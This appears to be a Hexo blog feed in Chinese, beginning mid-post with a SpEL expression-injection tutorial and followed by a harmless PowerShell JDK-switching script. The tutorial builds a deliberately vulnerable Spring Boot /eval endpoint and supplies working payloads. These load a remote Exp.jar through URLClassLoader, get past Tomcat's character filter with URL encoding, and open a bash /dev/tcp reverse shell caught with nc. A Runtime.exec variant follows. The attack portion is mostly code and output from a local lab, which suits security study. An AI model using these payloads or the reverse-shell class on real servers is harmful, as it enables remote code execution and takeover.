class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.urlClassloader;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoApplication</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(DemoApplication.class, args);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.example.demo.urlClassloader;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.*;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.*;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvalController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/eval&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String exp)</span> &#123;<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(exp);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> expression.getValue();<br>        <span class="hljs-keyword">return</span> String.valueOf(result);<br>    &#125;<br>&#125;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br> xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0</span><br><span class="hljs-string">         https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>&lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>&lt;groupId&gt;com.test&lt;/groupId&gt;<br>&lt;artifactId&gt;demo&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">1.0</span>&lt;/version&gt;<br>&lt;packaging&gt;jar&lt;/packaging&gt;<br><br>&lt;parent&gt;<br>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">2.3</span><span class="hljs-number">.12</span>.RELEASE&lt;/version&gt;<br>&lt;/parent&gt;<br><br>&lt;dependencies&gt;<br>&lt;dependency&gt;<br>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;<br>&lt;/dependency&gt;<br>&lt;/dependencies&gt;<br><br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210844.png" alt="img"></p><p>5）做完准备工作，我们就可以构造 payload 进行测试了</p><p>原始 payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;<br>    ).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;aaa&quot;</span>)<br></code></pre></td></tr></table></figure><p>如果直接注入：</p><p>内容就会被 Tomcat 拦截， 从 <strong>Tomcat 8.5+ &#x2F; 9+</strong> 开始， <code>{ } [ ] ( ) &quot; . </code> 这些字符如果未编码 <strong>会直接被拒绝</strong>。  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210844.png"></p><p>对 payload 进行 URL 编码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span>%20java.net.URLClassLoader(<br>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%20new%20java.net.URL%5B%<span class="hljs-number">5D</span>%7Bnew%20java.net.URL(%22http%3A%<span class="hljs-number">2F</span>%2F127<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%3A8999%2FExp.jar%<span class="hljs-number">22</span>)%<span class="hljs-number">7D</span><br>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>).loadClass(%22Exp%<span class="hljs-number">22</span>).getConstructors()%5B0%<span class="hljs-number">5D</span>.newInstance(%22aaa%<span class="hljs-number">22</span>)<br></code></pre></td></tr></table></figure><p>编码之后再进行注入，就可以弹出计算器了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211140.png" alt="img"></p><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h4><p>1） 先准备恶意类并编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exp</span><span class="hljs-params">(String address)</span>&#123;<br>        address = address.replace(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<br>                    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<br>                    <span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/&quot;</span> + address + <span class="hljs-string">&quot;; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><br>        );<br>            p.start();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171736764.png" alt="img"></p><p>2）借用 Windows 中写好的 SpringBoot 项目启动漏洞 Demo</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar demo-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.jar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211770.png" alt="img"></p><p>3）启动本地 http 服务</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211478.png" alt="img"></p><p>4）nc 监听 2333 端口</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211117.png" alt="img"></p><p>5）传入恶意 payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">curl -G <span class="hljs-string">&quot;http://127.0.0.1:8876/eval&quot;</span> --data-urlencode &#x27;<span class="hljs-built_in">exp</span>=T(java.net.URLClassLoader).newInstance(<span class="hljs-built_in">new</span> java.net.URL[]&#123;<span class="hljs-built_in">new</span> java.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;127.0.0.1:2333&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>6）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211346.png" alt="img"></p><p>connect to [127.0.0.1] from localhost [127.0.0.1] 48096</p><ul><li>有一个进程从 <strong>本地（localhost）</strong></li><li>使用随机端口 <strong>48096</strong></li><li>连接到了监听端口 <strong>2333</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211129.png" alt="img"></p><p>如图，nc 已经获取到反弹 shell</p><p>可以执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211129.png"></p><h3 id="3-5-2-AppClassLoader"><a href="#3-5-2-AppClassLoader" class="headerlink" title="3.5.2 AppClassLoader"></a>3.5.2 AppClassLoader</h3><p> 利用 SpEL，直接用 AppClassLoader 加载本地已经存在的 class，并调用里面的代码。无需远程 URL</p><p>首先 <code>T(java.lang.ClassLoader)</code>获取 <code>ClassLoader</code> 类这个 Class 对象</p><p><code>T(java.lang.ClassLoader).getSystemClassLoader()</code>获取系统类加载器，即 <code>AppClassLoader</code>，接着加载<code>AppClassLoader</code>中的一个类<code>loadClass(&#39;java.lang.Runtime&#39;)</code>，调用<code>getRuntime()</code>执行命令<code>exec(&#39;calc&#39;)</code>。</p><p><code>AppClassLoader</code>和<code>URLClassLoader</code>的区别在于<code>AppClassLoader</code>加载的是本机 classpath 的类，本地攻击无需远程 URL；<code>URLClassLoader</code>可以加载任意 URL 的类，用于远程加载恶意类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.addClassLoader;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.ExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmdStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;<br>        <span class="hljs-comment">//创建解析器    </span><br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-comment">//解析表达式</span><br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(cmdStr);<br>        <span class="hljs-comment">//弹出计算器</span><br>        System.out.println(exp.getValue());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211750.png" alt="img"></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>SpEL（Spring表达语言）表达式详述：</p><p><a href="https://javacfox.github.io/2019/07/04/SpEL%EF%BC%88Spring%E8%A1%A8%E8%BE%BE%E8%AF%AD%E8%A8%80%EF%BC%89%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%A6%E8%BF%B0/">https://javacfox.github.io/2019/07/04/SpEL%EF%BC%88Spring%E8%A1%A8%E8%BE%BE%E8%AF%AD%E8%A8%80%EF%BC%89%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%A6%E8%BF%B0/</a></p><p>SpEL表达式：</p><p><a href="https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</a></p><p><a href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#%E9%80%9A%E8%BF%87-ClassLoader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9E%84%E9%80%A0-PoC-amp-Bypass">https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#%E9%80%9A%E8%BF%87-ClassLoader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9E%84%E9%80%A0-PoC-amp-Bypass</a></p><p><a href="http://101.36.122.13:4000/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#H1gIO">http://101.36.122.13:4000/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#H1gIO</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpEL 表达式注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Switch JDK versions in Windows</title>
    <link href="/2025/11/12/Switch%20JDK%20versions%20in%20Windows/"/>
    <url>/2025/11/12/Switch%20JDK%20versions%20in%20Windows/</url>
    
    <content type="html"><![CDATA[<h1 id="Switch-JDK-versions-in-Windows"><a href="#Switch-JDK-versions-in-Windows" class="headerlink" title="Switch JDK versions in Windows"></a>Switch JDK versions in Windows</h1><p>最近在安装工具时常常用到不同的 JDK 版本，而想要切换就得一条一条去修改环境变量，实在浪费时间。因此，通过 AI + 人工调试，终于推出了一款可以自动扫描已安装的所有 JDK 版本，并且快速切换的脚本。</p><h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># -----------------------------</span><br><span class="hljs-comment"># PowerShell 脚本：switchjdk.ps1</span><br><span class="hljs-comment"># 功能：在 Windows 下快速切换 Java 版本（自动检测 + 安全刷新）</span><br><span class="hljs-comment"># 用法： PowerShell 管理员模式下直接执行：.\switchjdk.ps1</span><br><span class="hljs-comment"># -----------------------------</span><br><br><span class="hljs-comment"># JDK 根目录（根据自己的 JDK 安装路径调整）</span><br><span class="hljs-variable">$javaBase</span> = <span class="hljs-string">&quot;D:\Java&quot;</span><br><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n==========================&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;🔍 扫描到已有的 Java JDK 版本：&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;==========================&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><br><span class="hljs-comment"># 获取所有 JDK 目录（按名称排序，防止索引错位）</span><br><span class="hljs-variable">$jdkList</span> = <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$javaBase</span> <span class="hljs-literal">-Directory</span> |<br>    <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.Name <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;^jdk&quot;</span> &#125; |<br>    <span class="hljs-built_in">Sort-Object</span> Name<br><br><span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> <span class="hljs-variable">$jdkList</span>) &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;❌ 未找到任何 JDK 版本，请检查目录：<span class="hljs-variable">$javaBase</span>&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Red<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-comment"># 显示可选版本</span><br><span class="hljs-variable">$index</span> = <span class="hljs-number">1</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$jdk</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$jdkList</span>) &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;<span class="hljs-variable">$index</span>. <span class="hljs-variable">$</span>(<span class="hljs-variable">$jdk</span>.Name)&quot;</span><br>    <span class="hljs-variable">$index</span>++<br>&#125;<br><br><span class="hljs-comment"># 获取当前 JAVA_HOME</span><br><span class="hljs-variable">$currentJavaHome</span> = [<span class="hljs-type">Environment</span>]::GetEnvironmentVariable(<span class="hljs-string">&quot;JAVA_HOME&quot;</span>, <span class="hljs-string">&quot;Machine&quot;</span>)<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$currentJavaHome</span>) &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n💡 当前版本为：<span class="hljs-variable">$currentJavaHome</span>&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n⚠️ 当前系统未设置 JAVA_HOME&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125;<br><br><span class="hljs-comment"># 提示用户选择版本</span><br><span class="hljs-variable">$choice</span> = <span class="hljs-built_in">Read-Host</span> <span class="hljs-string">&quot;`n👉 请选择要更换的 JDK 序号（1-<span class="hljs-variable">$</span>&#123;jdkList.Count&#125;）&quot;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> (<span class="hljs-variable">$choice</span> <span class="hljs-operator">-as</span> [<span class="hljs-built_in">int</span>]) <span class="hljs-operator">-or</span> <span class="hljs-variable">$choice</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">1</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$choice</span> <span class="hljs-operator">-gt</span> <span class="hljs-variable">$jdkList</span>.Count) &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;❌ 无效选择，操作已取消。&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Red<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-comment"># 精确取选中版本</span><br><span class="hljs-variable">$selectedJdk</span> = <span class="hljs-variable">$jdkList</span> | <span class="hljs-built_in">Sort-Object</span> Name | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-Index</span> (<span class="hljs-variable">$choice</span> - <span class="hljs-number">1</span>)<br><span class="hljs-variable">$javaHome</span> = <span class="hljs-variable">$selectedJdk</span>.FullName<br><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n✅ 选择的 JDK：<span class="hljs-variable">$javaHome</span>&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><br><span class="hljs-comment"># 修改 JAVA_HOME（系统与用户级）</span><br>[<span class="hljs-type">Environment</span>]::SetEnvironmentVariable(<span class="hljs-string">&quot;JAVA_HOME&quot;</span>, <span class="hljs-variable">$javaHome</span>, <span class="hljs-string">&quot;User&quot;</span>)<br>[<span class="hljs-type">Environment</span>]::SetEnvironmentVariable(<span class="hljs-string">&quot;JAVA_HOME&quot;</span>, <span class="hljs-variable">$javaHome</span>, <span class="hljs-string">&quot;Machine&quot;</span>)<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;✅ JAVA_HOME 已更新为 <span class="hljs-variable">$javaHome</span>&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><br><span class="hljs-comment"># 更新 Path：移除旧 JDK/bin，添加新 JDK/bin</span><br><span class="hljs-variable">$oldPath</span> = [<span class="hljs-type">Environment</span>]::GetEnvironmentVariable(<span class="hljs-string">&quot;Path&quot;</span>, <span class="hljs-string">&quot;Machine&quot;</span>)<br><span class="hljs-variable">$newPathParts</span> = <span class="hljs-variable">$oldPath</span> <span class="hljs-operator">-split</span> <span class="hljs-string">&#x27;;&#x27;</span> | <span class="hljs-built_in">Where-Object</span> &#123;<br>    (<span class="hljs-variable">$_</span> <span class="hljs-operator">-notmatch</span> <span class="hljs-string">&quot;Java\\jdk&quot;</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$_</span> <span class="hljs-operator">-notmatch</span> <span class="hljs-string">&quot;Java\\jre&quot;</span>)<br>&#125;<br><span class="hljs-variable">$newPath</span> = (<span class="hljs-variable">$newPathParts</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$javaHome</span>\bin&quot;</span>) <span class="hljs-operator">-join</span> <span class="hljs-string">&#x27;;&#x27;</span><br>[<span class="hljs-type">Environment</span>]::SetEnvironmentVariable(<span class="hljs-string">&quot;Path&quot;</span>, <span class="hljs-variable">$newPath</span>, <span class="hljs-string">&quot;Machine&quot;</span>)<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;🔁 系统 Path 已更新。&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br><br><span class="hljs-comment"># 通知系统环境变量更新（立即生效）</span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$signature</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string">[DllImport(&quot;user32.dll&quot;, SetLastError=true, CharSet=CharSet.Auto)]</span><br><span class="hljs-string">public static extern IntPtr SendMessageTimeout(</span><br><span class="hljs-string">    IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam,</span><br><span class="hljs-string">    uint fuFlags, uint uTimeout, out UIntPtr lpdwResult);</span><br><span class="hljs-string">&quot;@</span><br>    <span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-MemberDefinition</span> <span class="hljs-variable">$signature</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;NativeMethods&quot;</span> <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&quot;WinAPI&quot;</span><br><br>    <span class="hljs-variable">$HWND_BROADCAST</span> = [<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]<span class="hljs-number">0</span>xffff<br>    <span class="hljs-variable">$WM_SETTINGCHANGE</span> = <span class="hljs-number">0</span>x1A<br>    <span class="hljs-variable">$result</span> = [<span class="hljs-type">UIntPtr</span>]::Zero<br><br>    [<span class="hljs-built_in">void</span>][<span class="hljs-type">WinAPI.NativeMethods</span>]::SendMessageTimeout(<br>        <span class="hljs-variable">$HWND_BROADCAST</span>, <span class="hljs-variable">$WM_SETTINGCHANGE</span>,<br>        [<span class="hljs-type">UIntPtr</span>]::Zero, <span class="hljs-string">&quot;Environment&quot;</span>,<br>        <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$result</span><br>    )<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;✅ System environment change broadcasted.&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Green<br>&#125; <span class="hljs-keyword">catch</span> &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;⚠️ Broadcast failed (但环境变量已更新)&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125;<br><br><span class="hljs-comment"># 更新当前会话环境变量</span><br><span class="hljs-variable">$env:JAVA_HOME</span> = <span class="hljs-variable">$javaHome</span><br><span class="hljs-variable">$env:Path</span> = <span class="hljs-variable">$newPath</span><br><br><span class="hljs-comment"># ⚙️ 清除 PowerShell 命令缓存，确保生效新版本</span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Get-Command</span> java <span class="hljs-literal">-ErrorAction</span> SilentlyContinue) &#123;<br>        <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> Function:\java <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>        <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> Alias:\java <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>    &#125;<br>    <span class="hljs-comment"># 清除缓存路径</span><br>    <span class="hljs-variable">$env:Path</span> = <span class="hljs-variable">$newPath</span><br>    [<span class="hljs-type">System.Environment</span>]::SetEnvironmentVariable(<span class="hljs-string">&quot;Path&quot;</span>, <span class="hljs-variable">$newPath</span>, <span class="hljs-string">&quot;Process&quot;</span>)<br>    <span class="hljs-comment"># 强制重新定位 java 可执行路径</span><br>    <span class="hljs-variable">$null</span> = &amp; where.exe java<br>&#125; <span class="hljs-keyword">catch</span> &#123;<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;⚠️ PowerShell 缓存刷新失败，但环境变量已更新&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125;<br><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n==========================&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Final check (java -version):&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;==========================&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br>&amp; java <span class="hljs-literal">-version</span><br><br></code></pre></td></tr></table></figure><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><p>首先将以上脚本内容进行保存，</p><p><img 